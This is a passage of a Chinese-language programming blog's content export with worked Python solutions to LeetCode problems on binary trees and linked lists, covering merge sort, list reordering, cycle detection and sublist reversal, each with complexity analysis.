可合并至 3. 和 4. 内，详见文章末尾代码。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# Definition for a binary tree node.from queue import Queueclass TreeNode: def __init__(self, x): self.val = x self.left = None self.right = Nonedef create_tree(list_tree,p,q): if not list_tree: return None new_queue= Queue() root = TreeNode(list_tree[0]) new_queue.put(root) # 先入队一个结点 count = 1 while not new_queue.empty() and count&lt;len(list_tree): dequeue = new_queue.get() # 出队 # 返回p,q指向结点 if p==dequeue.val: p=dequeue if q==dequeue.val: q=dequeue if not dequeue.left and not dequeue.right: if count&lt;len(list_tree) and list_tree[count]: dequeue.left=TreeNode(list_tree[count]) count= count+1 if count&lt;len(list_tree) and list_tree[count]: dequeue.right=TreeNode(list_tree[count]) count= count+1 if dequeue.left: new_queue.put(dequeue.left) if dequeue.right: new_queue.put(dequeue.right) #print(p.val,q.val) return root,p,qclass Solution: def lowestCommonAncestor(self, root: 'TreeNode', p: 'TreeNode', q: 'TreeNode') -&gt; 'TreeNode': if not root or root == p or root == q: return root left = self.lowestCommonAncestor(root.left, p, q) right = self.lowestCommonAncestor(root.right, p, q) if not left: return right if not right: return left return rootroot = [3,5,1,6,2,0,8,None,None,7,4]p=5q=1root_tree,p,q=create_tree(root,p,q)a=Solution()result =a.lowestCommonAncestor(root_tree,p,q)result.val 3时间复杂度 O(N) ： 其中 N 为二叉树节点数；最差情况下，需要递归遍历树的所有节点。 空间复杂度 O(N) ： 最差情况下，递归深度达到 N ，系统使用 O(N) 大小的额外空间。","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"二叉树","slug":"二叉树","permalink":"https://fishni.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"}]},{"title":"【数据结构与算法】【LeetCode】【链表】148.排序链表","slug":"LeetCode-A-链表-148. 排序链表","date":"2020-11-21T16:00:00.000Z","updated":"2020-11-22T08:02:49.898Z","comments":true,"path":"2020/11/22/LeetCode-A-链表-148. 排序链表/","link":"","permalink":"https://fishni.github.io/2020/11/22/LeetCode-A-%E9%93%BE%E8%A1%A8-148.%20%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/","excerpt":"链表中点查找、链表排序、归并排序、分治与递归、递归、非递归。","text":"链表中点查找、链表排序、归并排序、分治与递归、递归、非递归。 题目给你链表的头结点 head ，请将其按 升序 排列并返回 排序后的链表 。 进阶： 你可以在 O(n log n) 时间复杂度和常数级空间复杂度下，对链表进行排序吗？ 示例1 输入：head = [4,2,1,3] 输出：[1,2,3,4]示例2 输入：head = [-1,5,3,4,0] 输出：[-1,0,3,4,5]示例3 输入：head = [] 输出：[]题解方法一：字典 将结点地址和值存入字典，使用sorted函数按照值排序，重新构造成链表 1234567891011121314151617181920212223242526272829303132333435363738394041class ListNode: def __init__(self, val=0, next=None): self.val = val self.next = nextdef createLink_rearinsert(lista): head = ListNode(-1) rear = head for i in lista: new_node=ListNode(i) rear.next=new_node rear=new_node return head.nextclass Solution: def sortList(self, head: ListNode) -&gt; ListNode: if not head: return head dic=dict() while head: dic[head]=head.val head=head.next #print(dic) new_dic=sorted(dic.items(),key=lambda item:item[1]) head= ListNode(-1) rear = head for d in new_dic: rear.next = d[0] rear = rear.next rear.next=None return head.nextif __name__==\"__main__\": head = [-1,5,3,4,0] new_a=createLink_rearinsert(head) a1 = Solution() p=a1.sortList(new_a) list_head=[] while p!=None: list_head.append(p.val) p=p.next print(list_head) [-1, 0, 3, 4, 5]题目进阶分析这道题考虑时间复杂度更低的排序算法。题目的进阶问题要求达到O(nlogn) 的时间复杂度和 O(1) 的空间复杂度，时间复杂度是 O(nlogn) 的排序算法包括归并排序、堆排序和快速排序（快速排序的最差时间复杂度是 $O(n^2)$) 其中最适合链表的排序算法是归并排序。 归并排序基于分治算法。最容易想到的实现方式是自顶向下的递归实现，考虑到递归调用的栈空间，自顶向下归并排序的空间复杂度是O(logn)。如果要达到 O(1)的空间复杂度，则需要使用自底向上的实现方式。 方法二：自顶向下归并排序对链表自顶向下归并排序的过程如下。 找到链表的中点，以中点为分界，将链表拆分成两个子链表。寻找链表的中点可以使用快慢指针的做法，快指针每次移动 2 步，慢指针每次移动 1 步，当快指针到达链表末尾时，慢指针指向的链表节点即为链表的中点。 对两个子链表分别排序。 将两个排序后的子链表合并，得到完整的排序后的链表。 上述过程可以通过递归实现。递归的终止条件是链表的节点个数小于或等于 1，即当链表为空或者链表只包含 1 个节点时，不需要对链表进行拆分和排序。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647class Solution: def sortList(self, head: ListNode) -&gt; ListNode: def sortFunc(head: ListNode, tail: ListNode) -&gt; ListNode: if not head: return head if head.next == tail: head.next = None return head slow = fast = head while fast != tail: slow = slow.next fast = fast.next if fast != tail: fast = fast.next mid = slow return merge(sortFunc(head, mid), sortFunc(mid, tail)) def merge(head1: ListNode, head2: ListNode) -&gt; ListNode: dummyHead = ListNode(0) temp, temp1, temp2 = dummyHead, head1, head2 while temp1 and temp2: if temp1.val &lt;= temp2.val: temp.next = temp1 temp1 = temp1.next else: temp.next = temp2 temp2 = temp2.next temp = temp.next if temp1: temp.next = temp1 elif temp2: temp.next = temp2 return dummyHead.next return sortFunc(head, None)if __name__==\"__main__\": head = [-1,5,3,4,0,2] new_a=createLink_rearinsert(head) a1 = Solution() p=a1.sortList(new_a) list_head=[] while p!=None: list_head.append(p.val) p=p.next print(list_head) [-1, 0, 2, 3, 4, 5]自顶至底归并2通过递归实现链表归并排序，有以下两个环节： 分割 cut 环节： 找到当前链表中点，并从中点将链表断开（以便在下次递归 cut 时，链表片段拥有正确边界）； 我们使用 fast,slow 快慢双指针法，奇数个节点找到中点，偶数个节点找到中心左边的节点。 找到中点 slow 后，执行 slow.next = None 将链表切断。 递归分割时，输入当前链表左端点 head 和中心节点 slow 的下一个节点 tmp(因为链表是从 slow 切断的)。 cut 递归终止条件： 当head.next == None时，说明只有一个节点了，直接返回此节点。 合并 merge 环节： 将两个排序链表合并，转化为一个排序链表。 双指针法合并，建立辅助ListNode h 作为头部。 设置两指针 left, right 分别指向两链表头部，比较两指针处节点值大小，由小到大加入合并链表头部，指针交替前进，直至添加完两个链表。 返回辅助ListNode h 作为头部的下个节点 h.next。 时间复杂度 O(l + r)，l, r 分别代表两个链表长度。 当题目输入的 head == None 时，直接返回None。 1234567891011121314151617181920212223242526272829class Solution: def sortList(self, head: ListNode) -&gt; ListNode: if not head or not head.next: return head # termination. # cut the LinkedList at the mid index. slow, fast = head, head.next while fast and fast.next: fast, slow = fast.next.next, slow.next mid, slow.next = slow.next, None # save and cut. # recursive for cutting. left, right = self.sortList(head), self.sortList(mid) # merge `left` and `right` linked list and return it. h = res = ListNode(0) while left and right: if left.val &lt; right.val: h.next, left = left, left.next else: h.next, right = right, right.next h = h.next h.next = left if left else right return res.next if __name__==\"__main__\": head = [-1,5,3,4,0,6,2] new_a=createLink_rearinsert(head) a1 = Solution() p=a1.sortList(new_a) list_head=[] while p!=None: list_head.append(p.val) p=p.next print(list_head) [-1, 0, 2, 3, 4, 5, 6]方法三： 自底至顶归并排序 对于非递归的归并排序，需要使用迭代的方式替换cut环节： 我们知道，cut环节本质上是通过二分法得到链表最小节点单元，再通过多轮合并得到排序结果。 每一轮合并merge操作针对的单元都有固定长度intv，例如： 第一轮合并时intv = 1，即将整个链表切分为多个长度为1的单元，并按顺序两两排序合并，合并完成的已排序单元长度为2。 第二轮合并时intv = 2，即将整个链表切分为多个长度为2的单元，并按顺序两两排序合并，合并完成已排序单元长度为4。 以此类推，直到单元长度intv &gt;= 链表长度，代表已经排序完成。 根据以上推论，我们可以仅根据intv计算每个单元边界，并完成链表的每轮排序合并，例如: 当intv = 1时，将链表第1和第2节点排序合并，第3和第4节点排序合并，……。 当intv = 2时，将链表第1-2和第3-4节点排序合并，第5-6和第7-8节点排序合并，……。 当intv = 4时，将链表第1-4和第5-8节点排序合并，第9-12和第13-16节点排序合并，……。 此方法时间复杂度O(nlogn)，空间复杂度O(1)。 模拟上述的多轮排序合并： 统计链表长度length，用于通过判断intv &lt; length判定是否完成排序； 额外声明一个节点res，作为头部后面接整个链表，用于： intv *= 2即切换到下一轮合并时，可通过res.next找到链表头部h； 执行排序合并时，需要一个辅助节点作为头部，而res则作为链表头部排序合并时的辅助头部pre；后面的合并排序可以将上次合并排序的尾部tail用做辅助节点。 在每轮intv下的合并流程： 根据intv找到合并单元1和单元2的头部h1, h2。由于链表长度可能不是2^n，需要考虑边界条件： 在找h2过程中，如果链表剩余元素个数少于intv，则无需合并环节，直接break，执行下一轮合并； 若h2存在，但以h2为头部的剩余元素个数少于intv，也执行合并环节，h2单元的长度为c2 = intv - i。 合并长度为c1, c2的h1, h2链表，其中： 合并完后，需要修改新的合并单元的尾部pre指针指向下一个合并单元头部h。（在寻找h1, h2环节中，h指针已经被移动到下一个单元头部） 合并单元尾部同时也作为下次合并的辅助头部pre。 当h == None，代表此轮intv合并完成，跳出。 每轮合并完成后将单元长度×2，切换到下轮合并：intv *= 2。 1234567891011121314151617181920212223242526272829303132333435363738394041class Solution: def sortList(self, head: ListNode) -&gt; ListNode: h, length, intv = head, 0, 1 # 统计链表长度 while h: h, length = h.next, length + 1 res = ListNode(0) res.next = head # merge the list in different intv. while intv &lt; length: pre, h = res, res.next while h: # get the two merge head `h1`, `h2` h1, i = h, intv while i and h: h, i = h.next, i - 1 if i: break # no need to merge because the `h2` is None. h2, i = h, intv while i and h: h, i = h.next, i - 1 c1, c2 = intv, intv - i # the `c2`: length of `h2` can be small than the `intv`. # merge the `h1` and `h2`. while c1 and c2: if h1.val &lt; h2.val: pre.next, h1, c1 = h1, h1.next, c1 - 1 else: pre.next, h2, c2 = h2, h2.next, c2 - 1 pre = pre.next pre.next = h1 if c1 else h2 while c1 &gt; 0 or c2 &gt; 0: pre, c1, c2 = pre.next, c1 - 1, c2 - 1 pre.next = h intv *= 2 return res.nextif __name__==\"__main__\": head = [-1,5,3,4,0,6,7,2] new_a=createLink_rearinsert(head) a1 = Solution() p=a1.sortList(new_a) list_head=[] while p!=None: list_head.append(p.val) p=p.next print(list_head) [-1, 0, 2, 3, 4, 5, 6, 7]","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"链表","slug":"链表","permalink":"https://fishni.github.io/tags/%E9%93%BE%E8%A1%A8/"}]},{"title":"【数据结构与算法】【LeetCode】【链表】143.重排链表","slug":"LeetCode-A-链表-143. 重排链表","date":"2020-11-20T16:00:00.000Z","updated":"2020-11-21T07:47:06.749Z","comments":true,"path":"2020/11/21/LeetCode-A-链表-143. 重排链表/","link":"","permalink":"https://fishni.github.io/2020/11/21/LeetCode-A-%E9%93%BE%E8%A1%A8-143.%20%E9%87%8D%E6%8E%92%E9%93%BE%E8%A1%A8/","excerpt":"链表中点查找、链表反转、链表合并。","text":"链表中点查找、链表反转、链表合并。 题目给定一个单链表 L：L0→L1→…→Ln-1→Ln ， 将其重新排列后变为： L0→Ln→L1→Ln-1→L2→Ln-2→… 你不能只是单纯的改变节点内部的值，而是需要实际的进行节点交换。示例 1: 给定链表 1-&gt;2-&gt;3-&gt;4, 重新排列为 1-&gt;4-&gt;2-&gt;3. 示例 2: 给定链表 1-&gt;2-&gt;3-&gt;4-&gt;5, 重新排列为 1-&gt;5-&gt;2-&gt;4-&gt;3. 题解方法一：线性表因为链表不支持下标访问，所以我们无法随机访问链表中任意位置的元素。 因此比较容易想到的一个方法是，我们利用线性表存储该链表，然后利用线性表可以下标访问的特点，直接按顺序访问指定元素，重建该链表即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445# Definition for singly-linked list.class ListNode: def __init__(self, x): self.val = x self.next = Nonedef createLink_rearinsert(lista): head = ListNode(-1) rear = head for i in lista: new_node=ListNode(i) rear.next=new_node rear=new_node return head.nextclass Solution: def reorderList(self, head: ListNode) -&gt; None: if not head: return vec = list() node = head while node: vec.append(node) node = node.next i, j = 0, len(vec) - 1 while i &lt; j: vec[i].next = vec[j] i += 1 if i == j: break vec[j].next = vec[i] j -= 1 vec[i].next = None return headif __name__==\"__main__\": head = [1,2,3,4] new_a=createLink_rearinsert(head) a1 = Solution() p=a1.reorderList(new_a) list_head=[] while p!=None: list_head.append(p.val) p=p.next print(list_head) [1, 4, 2, 3]复杂度分析 时间复杂度：O(N)，其中 N是链表中的节点数。 空间复杂度：O(N)，其中 N 是链表中的节点数。主要为线性表的开销。 方法二：寻找链表中点 + 链表逆序 + 合并链表注意到目标链表即为将原链表的左半端和反转后的右半端合并后的结果。 这样我们的任务即可划分为三步： 找到原链表的中点 我们可以使用快慢指针来 O(N) 地找到链表的中间节点。 将原链表的右半端反转 我们可以使用迭代法实现链表的反转。 将原链表的两端合并。 因为两链表长度相差不超过 1，因此直接合并即可。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495class ListNode: def __init__(self, x): self.val = x self.next = Nonedef createLink_rearinsert(lista): head = ListNode(-1) rear = head for i in lista: new_node=ListNode(i) rear.next=new_node rear=new_node return head.nextclass Solution: def reorderList(self, head: ListNode) -&gt; None: if not head or not head.next: return tmp_head=ListNode(-1) ptr=head rear =tmp_head left_rear,right_start=self.list_in_node(head) #print(left_rear,right_start) # 若链表结点为奇数，则left_rear=right_start if left_rear==right_start: # 左链表头为ptr # 右链表头 right_ptr right_ptr= self.reverse_link(right_start.next) while ptr and right_ptr: rear.next=ptr ptr=ptr.next rear=rear.next rear.next=right_ptr right_ptr=right_ptr.next rear=rear.next rear.next=left_rear rear.next.next=None else: right_ptr=self.reverse_link(right_start) while ptr and right_ptr: rear.next=ptr ptr=ptr.next rear=rear.next rear.next=right_ptr right_ptr=right_ptr.next rear=rear.next rear.next=None head=tmp_head.next return head # 找链表中点 def list_in_node(self,head): slow =head fast=head.next while fast!=None and fast.next!=None: fast=fast.next.next slow =slow.next #print(slow.val) if not fast: left_rear=slow right_start=slow else: left_rear = slow right_start=slow.next return left_rear,right_start # 链表反转 def reverse_link(self,head): prev=head cur=head.next while cur!=None: third=cur.next cur.next=prev prev=cur cur=third head.next=None return previf __name__==\"__main__\": head = [1,2,3,4,5] new_a=createLink_rearinsert(head) a1 = Solution() p=a1.reorderList(new_a) list_head=[] while p!=None: list_head.append(p.val) p=p.next print(list_head) [1, 5, 2, 4, 3] 简化 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152class Solution: def reorderList(self, head: ListNode) -&gt; None: if not head: return mid = self.middleNode(head) l1 = head l2 = mid.next mid.next = None l2 = self.reverseList(l2) self.mergeList(l1, l2) return head def middleNode(self, head: ListNode) -&gt; ListNode: slow = fast = head while fast.next and fast.next.next: slow = slow.next fast = fast.next.next return slow def reverseList(self, head: ListNode) -&gt; ListNode: prev = None curr = head while curr: nextTemp = curr.next curr.next = prev prev = curr curr = nextTemp return prev def mergeList(self, l1: ListNode, l2: ListNode): while l1 and l2: l1_tmp = l1.next l2_tmp = l2.next l1.next = l2 l1 = l1_tmp l2.next = l1 l2 = l2_tmpif __name__==\"__main__\": head = [1,2,3,4,5] new_a=createLink_rearinsert(head) a1 = Solution() p=a1.reorderList(new_a) list_head=[] while p!=None: list_head.append(p.val) p=p.next print(list_head) [1, 5, 2, 4, 3]","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"链表","slug":"链表","permalink":"https://fishni.github.io/tags/%E9%93%BE%E8%A1%A8/"}]},{"title":"【数据结构与算法】【LeetCode】【链表】142.环形链表II","slug":"LeetCode-A-链表-142. 环形链表 II","date":"2020-11-19T16:00:00.000Z","updated":"2020-11-20T07:24:01.889Z","comments":true,"path":"2020/11/20/LeetCode-A-链表-142. 环形链表 II/","link":"","permalink":"https://fishni.github.io/2020/11/20/LeetCode-A-%E9%93%BE%E8%A1%A8-142.%20%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8%20II/","excerpt":"返回链表入环开始的第一个节点。","text":"返回链表入环开始的第一个节点。 题目给定一个链表，返回链表开始入环的第一个节点。 如果链表无环，则返回 null。 为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。注意，pos 仅仅是用于标识环的情况，并不会作为参数传递到函数中。 说明：不允许修改给定的链表。进阶： 你是否可以使用 O(1) 空间解决此题？ 示例1 输入：head = [3,2,0,-4], pos = 1 输出：返回索引为 1 的链表节点 解释：链表中有一个环，其尾部连接到第二个节点示例2 输入：head = [1,2], pos = 0 输出：返回索引为 0 的链表节点 解释：链表中有一个环，其尾部连接到第一个节点。示例3 输入：head = [1], pos = -1 输出：返回 null 解释：链表中没有环。提示： 链表中节点的数目范围是 $[0, 10^4]$ $-10^5 &lt;= Node.val &lt;= 10^5$ pos 为 -1 或者链表中的一个 有效索引 。 题解方法一：哈希表法123456789101112131415161718192021222324252627282930313233343536# Definition for singly-linked list.class ListNode: def __init__(self, x): self.val = x self.next = Nonedef createLink_rearinsert_cycle(lista,pos): head = ListNode(-1) rear = head for i in range(len(lista)): new_node=ListNode(lista[i]) if i==pos: pos_node = new_node rear.next=new_node rear=new_node if pos!=-1: rear.next=pos_node return head.nextclass Solution: def detectCycle(self, head: ListNode) -&gt; ListNode: seen = set() while head: if head in seen: return head seen.add(head) head = head.next return Noneif __name__==\"__main__\": head = [3,2,0,-4] pos = 1 new_a=createLink_rearinsert_cycle(head,pos) a1 = Solution() p=a1.detectCycle(new_a) print(p) &lt;__main__.ListNode object at 0x000001CED72B6A48&gt;复杂度分析 时间复杂度：O(N)，其中 N 为链表中节点的数目。我们恰好需要访问链表中的每一个节点。 空间复杂度：O(N)，其中 N 为链表中节点的数目。我们需要将链表中的每个节点都保存在哈希表当中。 方法二：快慢指针 思路与算法 我们使用两个指针，fast和slow。它们起始都位于链表的头部。随后，slow指针每次向后移动一个位置，而 fast指针向后移动两个位置。如果链表中存在环，则 fast 指针最终将再次与 slow 指针在环中相遇。 如下图所示，设链表中环外部分的长度为 a。slow 指针进入环后，又走了 b的距离与 fast 相遇。此时，fast指针已经走完了环的n圈，因此它走过的总距离为 a+n(b+c)+b=a+(n+1)b+nc。 根据题意，任意时刻，fast 指针走过的距离都为 slow指针的 2 倍。因此，我们有 $a+(n+1)b+nc=2(a+b)⟹a=c+(n−1)(b+c)$ 有了 $a=c+(n-1)(b+c)a=c+(n−1)(b+c)$ 的等量关系，我们会发现：从相遇点到入环点的距离加上 n-1 圈的环长，恰好等于从链表头部到入环点的距离。 因此，当发现 slow 与 fast相遇时，我们再额外使用一个指针 ptr。起始，它指向链表头部；随后，它和 slow 每次向后移动一个位置。最终，它们会在入环点相遇。 1234567891011121314151617181920212223242526272829303132333435363738394041424344# Definition for singly-linked list.class ListNode: def __init__(self, x): self.val = x self.next = Nonedef createLink_rearinsert_cycle(lista,pos): head = ListNode(-1) rear = head for i in range(len(lista)): new_node=ListNode(lista[i]) if i==pos: pos_node = new_node rear.next=new_node rear=new_node if pos!=-1: rear.next=pos_node return head.nextclass Solution: def detectCycle(self, head: ListNode) -&gt; ListNode: if not head or not head.next: return None slow = head fast = head.next while slow != fast: if not fast or not fast.next: return None slow = slow.next fast = fast.next.next ptr=head while ptr!=slow.next: ptr=ptr.next slow=slow.next return ptr if __name__==\"__main__\": head = [3,2,0,-4] pos = 1 new_a=createLink_rearinsert_cycle(head,pos) a1 = Solution() p=a1.detectCycle(new_a) print(p) &lt;__main__.ListNode object at 0x000001CED72B6208&gt;","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"链表","slug":"链表","permalink":"https://fishni.github.io/tags/%E9%93%BE%E8%A1%A8/"}]},{"title":"【数据结构与算法】【LeetCode】【链表】141.环形链表I","slug":"LeetCode-A-链表-141. 环形链表","date":"2020-11-18T16:00:00.000Z","updated":"2020-11-19T09:46:10.958Z","comments":true,"path":"2020/11/19/LeetCode-A-链表-141. 环形链表/","link":"","permalink":"https://fishni.github.io/2020/11/19/LeetCode-A-%E9%93%BE%E8%A1%A8-141.%20%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8/","excerpt":"判断链表是否有环","text":"判断链表是否有环 题目给定一个链表，判断链表中是否有环。 如果链表中有某个节点，可以通过连续跟踪 next 指针再次到达，则链表中存在环。 为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。注意：pos 不作为参数进行传递，仅仅是为了标识链表的实际情况。 如果链表中存在环，则返回 true 。 否则，返回 false 。 进阶： 你能用 O(1)（即，常量）内存解决此问题吗？ 示例1： 输入：head = [3,2,0,-4], pos = 1 输出：true 解释：链表中有一个环，其尾部连接到第二个节点。示例2： 输入：head = [1,2], pos = 0 输出：true 解释：链表中有一个环，其尾部连接到第一个节点。示例3： 输入：head = [1], pos = -1 输出：false 解释：链表中没有环。提示： 链表中节点的数目范围是 $[0, 10^4]$ $-10^5 &lt;= Node.val &lt;= 10^5$ pos 为 -1 或者链表中的一个 有效索引 。 题解方法一：哈希表 思路及算法 最容易想到的方法是遍历所有节点，每次遍历到一个节点时，判断该节点此前是否被访问过。 具体地，我们可以使用哈希表来存储所有已经访问过的节点。每次我们到达一个节点，如果该节点已经存在于哈希表中，则说明该链表是环形链表，否则就将该节点加入哈希表中。重复这一过程，直到我们遍历完整个链表即可。 复杂度分析 时间复杂度：O(N)，其中 N 是链表中的节点数。最坏情况下我们需要遍历每个节点一次。 空间复杂度：O(N)，其中N 是链表中的节点数。主要为哈希表的开销，最坏情况下我们需要将每个节点插入到哈希表中一次。 1234567891011121314151617181920212223242526272829303132333435# Definition for singly-linked list.class ListNode: def __init__(self, x): self.val = x self.next = Nonedef createLink_rearinsert_cycle(lista,pos): head = ListNode(-1) rear = head for i in range(len(lista)): new_node=ListNode(lista[i]) if i==pos: pos_node = new_node rear.next=new_node rear=new_node if pos!=-1: rear.next=pos_node return head.nextclass Solution: def hasCycle(self, head: ListNode) -&gt; bool: seen = set() while head: if head in seen: return True seen.add(head) head = head.next return Falseif __name__==\"__main__\": head = [3,2,0,-4] pos = 1 new_a=createLink_rearinsert_cycle(head,pos) a1 = Solution() p=a1.hasCycle(new_a) print(p) True方法二：快慢指针 思路及算法 本方法需要读者对「Floyd 判圈算法」（又称龟兔赛跑算法）有所了解。 假想「乌龟」和「兔子」在链表上移动，「兔子」跑得快，「乌龟」跑得慢。当「乌龟」和「兔子」从链表上的同一个节点开始移动时，如果该链表中没有环，那么「兔子」将一直处于「乌龟」的前方；如果该链表中有环，那么「兔子」会先于「乌龟」进入环，并且一直在环内移动。等到「乌龟」进入环时，由于「兔子」的速度快，它一定会在某个时刻与乌龟相遇，即套了「乌龟」若干圈。 我们可以根据上述思路来解决本题。具体地，我们定义两个指针，一快一满。慢指针每次只移动一步，而快指针每次移动两步。初始时，慢指针在位置 head，而快指针在位置 head.next。这样一来，如果在移动的过程中，快指针反过来追上慢指针，就说明该链表为环形链表。否则快指针将到达链表尾部，该链表不为环形链表。 细节 为什么我们要规定初始时慢指针在位置 head，快指针在位置 head.next，而不是两个指针都在位置 head（即与「乌龟」和「兔子」中的叙述相同）？ 观察下面的代码，我们使用的是 while 循环，循环条件先于循环体。由于循环条件一定是判断快慢指针是否重合，如果我们将两个指针初始都置于 head，那么 while 循环就不会执行。因此，我们可以假想一个在 head 之前的虚拟节点，慢指针从虚拟节点移动一步到达 head，快指针从虚拟节点移动两步到达 head.next，这样我们就可以使用 while 循环了。 当然，我们也可以使用 do-while 循环。此时，我们就可以把快慢指针的初始值都置为 head。 1234567891011121314151617181920212223242526272829303132333435363738394041# Definition for singly-linked list.class ListNode: def __init__(self, x): self.val = x self.next = Nonedef createLink_rearinsert_cycle(lista,pos): head = ListNode(-1) rear = head for i in range(len(lista)): new_node=ListNode(lista[i]) if i==pos: pos_node = new_node rear.next=new_node rear=new_node if pos!=-1: rear.next=pos_node return head.nextclass Solution: def hasCycle(self, head: ListNode) -&gt; bool: if not head or not head.next: return False slow = head fast = head.next while slow != fast: if not fast or not fast.next: return False slow = slow.next fast = fast.next.next return True if __name__==\"__main__\": head = [3,2,0,-4] pos = 1 new_a=createLink_rearinsert_cycle(head,pos) a1 = Solution() p=a1.hasCycle(new_a) print(p) True","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"链表","slug":"链表","permalink":"https://fishni.github.io/tags/%E9%93%BE%E8%A1%A8/"}]},{"title":"【数据结构与算法】【LeetCode】【链表】92. 反转链表II","slug":"LeetCode-A-链表-92. 反转链表 II","date":"2020-11-17T16:00:00.000Z","updated":"2020-11-18T02:49:52.487Z","comments":true,"path":"2020/11/18/LeetCode-A-链表-92. 反转链表 II/","link":"","permalink":"https://fishni.github.io/2020/11/18/LeetCode-A-%E9%93%BE%E8%A1%A8-92.%20%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8%20II/","excerpt":"链表反转","text":"链表反转 题目反转从位置 m 到 n 的链表。请使用一趟扫描完成反转。 说明: 1 ≤ m ≤ n ≤ 链表长度。 示例: 输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, m = 2, n = 4 输出: 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;NULL题解方法一：递归123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172# Definition for singly-linked list.class ListNode: def __init__(self, x): self.val = x self.next = Nonedef createLink_rearinsert(lista): head = ListNode(-1) rear = head for i in lista: new_node=ListNode(i) rear.next=new_node rear=new_node return head.nextclass Solution: def reverseBetween(self, head, m, n): \"\"\" :type head: ListNode :type m: int :type n: int :rtype: ListNode \"\"\" if not head: return None left, right = head, head stop = False def recurseAndReverse(right, m, n): nonlocal left, stop # base case. Don't proceed any further if n == 1: return # Keep moving the right pointer one step forward until (n == 1) right = right.next # Keep moving left pointer to the right until we reach the proper node # from where the reversal is to start. if m &gt; 1: left = left.next # Recurse with m and n reduced. recurseAndReverse(right, m - 1, n - 1) # In case both the pointers cross each other or become equal, we # stop i.e. don't swap data any further. We are done reversing at this # point. if left == right or right.next == left: stop = True # Until the boolean stop is false, swap data between the two pointers if not stop: left.val, right.val = right.val, left.val # Move left one step to the right. # The right pointer moves one step back via backtracking. left = left.next recurseAndReverse(right, m, n) return headif __name__==\"__main__\": a=[1,4,3,2,5,2] new_a=createLink_rearinsert(a) a1 = Solution() p=a1.reverseBetween(new_a,2,4) list1=[] while(p!=None): list1.append(p.val) #print(p.val) p=p.next print(list1) [1, 2, 3, 4, 5, 2]方法二：迭代若有一个三个不同结点组成的链表 A → B → C，实现反转结点中的链接成为 A ← B ← C。 试想两个结点翻转时，令pre指针指向A，cur指向B 1234third &#x3D; cur.next # 方便找到一结点cur.next &#x3D; prevprev &#x3D; curcur &#x3D; third 迭代实现上述过程即可完成链表翻转 如上所述，我们需要两个指针 prev 和 cur。 prev 指针初始化为 None，cur 指针初始化为链表的 head。 一步步地向前推进 cur 指针，prev 指针跟随其后。 如此推进两个指针，直到 cur 指针到达从链表头起的第 m 个结点。这就是我们反转链表的起始位置。 注意我们要引入两个额外指针，分别称为 tail 和 con。tail 指针指向从链表头起的第m个结点，此结点是反转后链表的尾部，故称为 tail。con 指针指向第 m 个结点的前一个结点，此结点是新链表的头部。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364# Definition for singly-linked list.class ListNode: def __init__(self, x): self.val = x self.next = Nonedef createLink_rearinsert(lista): head = ListNode(-1) rear = head for i in lista: new_node=ListNode(i) 